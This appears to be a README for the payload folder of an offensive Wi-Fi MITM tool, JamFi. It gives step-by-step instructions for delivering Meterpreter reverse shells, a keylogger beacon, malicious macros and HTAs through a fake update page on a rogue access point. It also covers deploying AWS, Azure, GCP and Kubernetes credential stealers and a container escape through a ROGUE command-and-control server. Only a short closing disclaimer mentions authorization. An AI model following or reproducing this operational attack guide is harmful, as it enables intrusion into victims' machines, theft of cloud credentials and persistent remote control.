# JamFi Payloads – MITM Tips & Tricks

This folder contains real payloads delivered by JamFi's MITM HID Injection module (Option 11). Each payload behaves differently and may require you to open a listener, run Metasploit, serve follow-up files, or set up the ROGUE Command & Control (C2) server. All payloads are delivered via http://10.0.0.1 by JamFi's MITM module. Logs from keystrokes and page visits are saved to loot/keystroke_log_*.txt and loot/session_log_*.txt. You do not need to change the IP — JamFi handles it. Just make sure you're listening or serving the next stage where needed.

---

### Original Payloads

- **loot_dropper.py** – A Python script that grabs and runs another payload from your hosted server. Before delivery, run sudo python3 -m http.server 4444 and place your follow-up script (e.g., payload.py) in that directory.

- **payload.exe** – A real Windows Meterpreter reverse shell. Requires Metasploit: msfconsole, use exploit/multi/handler, set payload windows/meterpreter/reverse_tcp, set LHOST and LPORT, then run.

- **payload.bat** – A Windows batch script that downloads and runs payload.exe via PowerShell. Ensure payload.exe is served at http://10.0.0.1/payload.exe.

- **payload.hta** – A Windows HTML application that auto-executes a PowerShell payload. Ideal for older Windows/IE. Ensure payload.exe is reachable at the hardcoded link.

- **autostart.html** – A fake update page that redirects to download payload.exe immediately. Simple and effective for drive-by delivery.

- **macro.vba** – A Word macro script that executes a PowerShell command. Must be embedded in a .docm file manually.

- **keylogger_beacon.py** – A Python keylogger beacon that connects to your server. Listen on the defined port or modify it. Best for staged post-exploitation or EDR testing.

- **reverse_shell.zip** – A zipped Bash reverse shell. When extracted and run, it connects back. Run sudo nc -lvnp 4444 beforehand to catch the shell.

---

### New Cloud & Cross-Platform Payloads (from ROGUE C2)

These payloads are designed for advanced reconnaissance and exploitation, particularly in cloud environments (AWS, Azure, GCP, Kubernetes) and on standard Linux/macOS systems. Some act as implants that connect back to a ROGUE Command & Control (C2) server.

#### Prerequisite: Setting Up the ROGUE C2 Server

For rogue_implant.py and any payload deployed via it, you must have the ROGUE C2 server running on your attack machine or a VPS.

1.  Clone and setup ROGUE (if you haven't already):
    ```bash
    git clone https://github.com/ekomsSavior/rogue.git
    cd rogue
    pip3 install -r requirements.txt
    ```

2.  Start the C2 Server:
    ```bash
    python3 rogue_c2.py
    ```
    This starts a web panel on http://localhost:4444/admin and creates ngrok tunnels.

3.  Configure the Implant: Before deploying rogue_implant.py via JamFi, edit the file to point to your C2 server. Update these lines:
    ```python
    C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'  # Replace with your ngrok URL
    C2_PORT = 4444
    PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
    ```

#### New Payload Instructions

- **rogue_implant.py** – The main ROGUE implant. When delivered and run on a target, it phones home to your ROGUE C2 server. From the C2 web panel, you can then run cloud environment detection, deploy further payloads, and establish persistence. No local listener needed; the implant initiates the connection back to your C2.

- **cloud_detector.py** – A Python script that automatically detects if it's running in AWS, Azure, GCP, Docker, or Kubernetes. Ideal for initial recon. Run it standalone or via the ROGUE implant. No special listener required.

- **aws_credential_stealer.py** – Harvests AWS credentials from instance metadata, CLI config files, and environment variables. Best deployed via the ROGUE implant after cloud detection confirms an AWS environment.

- **azure_cred_harvester.py** – Steals Azure managed identity tokens and credentials. Deploy via ROGUE implant on Azure VMs.

- **gcp_cred_harvester.py** – Harvests Google Cloud Platform service account credentials and metadata. Deploy via ROGUE implant on GCP VMs.

- **container_escape.py** – Attempts to break out of Docker containers and access the host system. For use on targets confirmed to be containers.

- **k8s_secret_stealer.py** – Harvests secrets and configurations from Kubernetes pods and the cluster API. Deploy via ROGUE implant on a compromised pod.

---

### How to Use These Payloads in JamFi

1.  **Place the Files**: Ensure all desired payloads are in the Jam_fi/payloads/ directory.

2.  **Start Required Infrastructure**:
    - For original payloads: Start your Metasploit handler, netcat listener, or Python HTTP server as described.
    - For ROGUE payloads: Start your ROGUE C2 server (python3 rogue_c2.py) and ensure its ngrok tunnel is active.

3.  **Launch JamFi MITM Attack**:
    - Run JamFi: sudo python3 jam_fi.py
    - Choose Option 11 (MITM HID Injection).
    - Select your target payload from the list.
    - JamFi handles the rest, serving the file from http://10.0.0.1.

4.  **Victim Interaction**: The victim connects to your fake AP, sees the fake update page, and clicks to download/run the payload.

5.  **Receive Shell / Callback**:
    - For rogue_implant.py, check your ROGUE C2 web panel (http://localhost:4444/admin) – a new bot should appear in the "Active Bots" tab. From there, use the "Cloud Ops" tab to run environment-specific reconnaissance and exploitation.

---

### Important Notes

- **Dependencies**: Cloud payloads often require Python libraries (boto3, azure-identity, kubernetes). The target system may not have these. In a lab, you can pre-install them or use PyInstaller to create standalone binaries.
- **Detection**: These payloads are for authorized testing. Modern EDR solutions may detect them.
- **C2 Reliability**: If using rogue_implant.py, ensure your ROGUE C2 server is stable and the ngrok URL is correctly configured in the implant before deploying it via JamFi.

**DISCLAIMER: Only test in controlled environments you have permission to test on. User assumes all risk.**
